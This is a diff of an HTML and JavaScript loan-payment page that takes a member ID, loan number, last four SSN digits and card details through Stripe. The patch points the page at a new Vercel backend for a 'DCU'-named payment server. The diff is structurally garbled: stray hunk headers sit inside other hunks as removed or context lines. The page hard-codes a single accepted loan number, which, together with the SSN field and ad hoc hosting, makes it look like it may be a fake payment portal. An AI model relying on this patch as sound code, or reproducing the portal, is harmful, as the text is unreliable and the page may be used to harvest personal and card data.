@@ -171,21 +171,7 @@
       border-top-color: #fff; border-radius: 50%;
       animation: spin 0.8s linear infinite;
       margin-right: 8px; vertical-align: middle;
-
-
-
-
-
-
-
-
     }
-
-
-
-
-
-
     @media (max-width: 600px) {
       .card { padding: 32px 24px; }
       .row { flex-direction: column; }
@@ -200,7 +186,22 @@
   <div id="step0" class="card">
     <div class="mb-32 text-center">
       <svg viewBox="0 0 480 180" style="width:220px;height:82px;margin:0 auto;display:block">
-@@ -205,49 +83,93 @@
+        <g transform="translate(20, 5)">
+          <path d="M10,5 L55,5 Q120,5 120,85 Q120,165 55,165 L10,165 L10,135 L50,135 Q88,135 88,85 Q88,35 50,35 L40,35 L40,135 L10,135 Z" fill="#0d7c5f"/>
+          <path d="M245,5 Q155,5 155,85 Q155,165 245,165 L245,135 Q185,135 185,85 Q185,35 245,35 Z" fill="#0d7c5f"/>
+          <polygon points="245,5 245,35 280,5" fill="#0d7c5f"/>
+          <polygon points="245,165 245,135 280,165" fill="#0d7c5f"/>
+          <path d="M310,5 L340,5 L340,105 Q340,140 370,140 Q400,140 400,105 L400,5 L430,5 L430,110 Q430,170 370,170 Q310,170 310,110 Z" fill="#0d7c5f"/>
+          <line x1="55" y1="-10" x2="-30" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="80" y1="-10" x2="-5" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="105" y1="-10" x2="20" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="215" y1="-10" x2="130" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="240" y1="-10" x2="155" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="265" y1="-10" x2="180" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="370" y1="-10" x2="285" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="395" y1="-10" x2="310" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <line x1="420" y1="-10" x2="335" y2="180" stroke="white" stroke-width="3" opacity="0.4"/>
+          <text x="436" y="16" font-size="14" fill="#0d7c5f" font-family="Arial, sans-serif" font-weight="700">SM</text>
         </g>
       </svg>
     </div>
@@ -234,47 +235,6 @@
     <div class="text-center" style="padding:24px 0 20px">
       <span style="font-size:28px;font-weight:300;color:#636e72">$</span>
       <input id="amountInput" class="amount-input" type="text" placeholder="0.00" inputmode="decimal">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     </div>
     <div class="text-center mb-36" style="display:flex;gap:10px;justify-content:center" id="quickAmounts"></div>
     <div class="btn-row">
@@ -288,22 +248,23 @@
     <h2 style="font-size:20px;font-weight:400;margin:0 0 8px">Payment Details</h2>
     <p id="paymentDesc" style="font-size:14px;color:#636e72;margin:0 0 28px"></p>
     <div class="mb-20">
-
-
-
-
-
-
-
-
-
-
-
-
       <span class="label">Card Information</span>
       <div id="card-element" class="stripe-card"></div>
     </div>
-@@ -268,8 +190,8 @@
+    <div id="errorBox" class="error-box"></div>
+    <div class="security-badge">
+      <span>&#128274;</span>
+      <span>Secured with 256-bit encryption. Card data is handled directly by Stripe and never touches our servers.</span>
+    </div>
+    <div class="btn-row">
+      <button class="btn-secondary" onclick="goStep(1)">&#8592; Back</button>
+      <button id="btnPay" class="btn-primary" disabled>PAY $0.00</button>
+    </div>
+  </div>
+
+  <!-- STEP 3: Success -->
+  <div id="step4" class="card hidden text-center">
+    <div class="success-icon">&#10003;</div>
     <h2 style="font-size:22px;font-weight:500;margin:0 0 8px">Payment Successful</h2>
     <p id="txnIdText" style="font-size:13px;color:#636e72;margin:0 0 4px"></p>
     <p id="successAmount" style="font-size:34px;font-weight:700;color:#0d7c5f;margin:20px 0"></p>
@@ -312,7 +273,9 @@
   </div>
 </div>
 
-@@ -279,13 +201,11 @@
+<footer>
+  <div style="margin-bottom:6px">
+    <a href="#" class="link" style="margin-right:8px;font-size:11px" onclick="return false">Terms and Conditions</a>
     <span style="color:#d1d5db">|</span>
     <a href="#" class="link" style="margin-left:8px;font-size:11px" onclick="return false">Privacy Policy</a>
   </div>
@@ -324,17 +287,27 @@
   var VALID_LOAN = "142";
 
   var STRIPE_PK = "pk_live_51TDTWuLddXPCkpyg93HlORgO6D22Gw0D9MhgU5SJjBmnkEhh91K81qqmgh4D3Ww3p1FnQyEOBcKAOqDXAzRDeU0800PEY8sLS3";
-  var API_URL = "https://dcu-payment-server.onrender.com";
 
-@@ -298,92 +218,70 @@
+  // ✅ FIX 1: Updated to Vercel backend URL (was dcu-payment-server.onrender.com)
+  var API_URL = "https://dcu-payment-backend.vercel.app";
+
+  var stripe = Stripe(STRIPE_PK);
+  var elements = stripe.elements();
+  var cardElement = elements.create("card", {
+    style: {
+      base: {
+        fontSize: "16px",
+        color: "#2d3436",
+        fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif",
+        "::placeholder": { color: "#aab7c4" }
+      },
+      invalid: { color: "#e74c3c", iconColor: "#e74c3c" }
     }
   });
 
   var currentStep = 0;
   var cardMounted = false;
   var cardComplete = false;
-
-
 
   function $(id) { return document.getElementById(id); }
   var memberId = $("memberId");
@@ -382,8 +355,6 @@
     document.querySelectorAll(".quick-btn").forEach(function(btn) {
       btn.classList.toggle("active", btn.dataset.amount === amountInput.value);
     });
-
-
   }
 
   function goStep(n) {
@@ -397,8 +368,6 @@
       var amt = parseFloat(amountInput.value || 0).toFixed(2);
       $("paymentDesc").innerHTML = 'Enter your card information below. Your payment of <strong style="color:#0d7c5f">$' + amt + '</strong> will be processed securely.';
       btnPay.textContent = "PAY $" + amt;
-
-
       errorBox.style.display = "none";
       if (!cardMounted) { cardElement.mount("#card-element"); cardMounted = true; }
       checkStep2();
@@ -417,8 +386,6 @@
 
   btnContinue.addEventListener("click", function() { if (!btnContinue.disabled) goStep(2); });
 
-
-
   cardElement.on("change", function(event) {
     cardComplete = event.complete;
     if (event.error) { errorBox.textContent = event.error.message; errorBox.style.display = "block"; }
@@ -427,19 +394,24 @@
   });
 
   btnPay.addEventListener("click", async function() {
-@@ -392,11 +290,11 @@
+    if (btnPay.disabled) return;
+    btnPay.disabled = true;
     btnPay.innerHTML = '<span class="spinner"></span> PROCESSING...';
     errorBox.style.display = "none";
     try {
       var amount = Math.round(parseFloat(amountInput.value) * 100);
-      var res = await fetch(API_URL + "/create-payment-intent", {
+
+      // ✅ FIX 2: Updated path to /api/create-payment-intent (was /create-payment-intent)
+      var res = await fetch(API_URL + "/api/create-payment-intent", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ amount: amount, currency: "usd", metadata: { memberId: memberId.value, loanNumber: loanNumber.value } })
       });
       var data = await res.json();
       if (data.error) { showError(data.error); return; }
-@@ -406,8 +304,8 @@
+      var result = await stripe.confirmCardPayment(data.clientSecret, {
+        payment_method: { card: cardElement }
+      });
       if (result.error) { showError(result.error.message); return; }
       if (result.paymentIntent.status === "succeeded") {
         $("txnIdText").textContent = "Transaction ID: " + result.paymentIntent.id;
@@ -448,7 +420,8 @@
         goStep(4);
       }
     } catch (err) { showError("Payment failed. Please check your connection and try again."); }
-@@ -416,16 +314,18 @@
+  });
+
   function showError(msg) {
     errorBox.textContent = msg;
     errorBox.style.display = "block";
@@ -459,11 +432,10 @@
   function resetForm() {
     memberId.value = ""; loanNumber.value = ""; lastFourSSN.value = "";
     amountInput.value = ""; $("setupProfile").checked = false;
-
     cardElement.clear(); cardComplete = false;
     btnLogin.disabled = true; btnContinue.disabled = true; btnPay.disabled = true;
     errorBox.style.display = "none"; loginError.style.display = "none"; goStep(0);
-
   }
 </script>
 </body>
+</html>
